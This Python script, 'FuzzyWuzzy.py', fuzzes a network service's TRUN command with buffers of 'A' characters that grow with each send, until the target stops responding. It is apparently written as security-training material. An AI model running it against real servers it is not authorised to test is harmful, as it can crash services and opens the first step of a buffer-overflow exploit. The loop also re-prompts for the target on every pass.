#! /usr/bin/python
#################################################################################################
# Author: Nicholas Fisher
# Date: July 7th 2024
# Description of Script
# `FuzzyWuzzy.py` is a Python script designed for network fuzzing, a technique used in 
# cybersecurity testing to discover vulnerabilities in software by sending malformed or
# unexpected data inputs. The script begins by prompting the user to enter the IPv4 address
# and TCP port of the target server. It then establishes a TCP connection and repeatedly 
# sends increasingly larger payloads of 'A' characters to the server's TRUN command endpoint.
# This process helps simulate various attack scenarios where unexpected input sizes might 
# trigger software crashes or reveal security weaknesses. FuzzyWuzzy.py employs socket
# programming for network communication and incorporates robust error handling to detect
# and report crashes in the target server, enhancing its effectiveness in vulnerability
# assessment.
#################################################################################################
import sys
import socket
from time import sleep

# Initialize the buffer with 100 'A' characters
buff = "A" * 100

while True:
    try:
        # Create a socket object with IPv4 addressing and TCP connection
        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Ask the user to input the target IPv4 address and store it in the variable 'IPv4'
        IPv4 = input("Please enter the IPv4 address of the target: ")

        # Ask the user to input the target TCP port and convert it to an integer, then store it in the variable 'TCP'
        TCP = int(input("Please enter the TCP port of the target: "))

        # Attempt to connect to the target at the provided IPv4 address and TCP port
        soc.connect((IPv4, TCP))

        # Send a crafted payload to the target server
        soc.send(('TRUN /.:/' + buff).encode())  # Ensure the message is encoded properly before sending

        soc.close()  # Close the socket connection

        sleep(1)  # Wait for 1 second before sending the next payload

        buff += "A" * 100  # Expand the buffer by adding another 100 'A' characters

    except Exception as e:
        # Handle any exceptions that occur during the fuzzing process
        print(f"Fuzzing crashed vulnerable server at {len(buff)} bytes")
        sys.exit()  # Exit the script upon encountering an issue
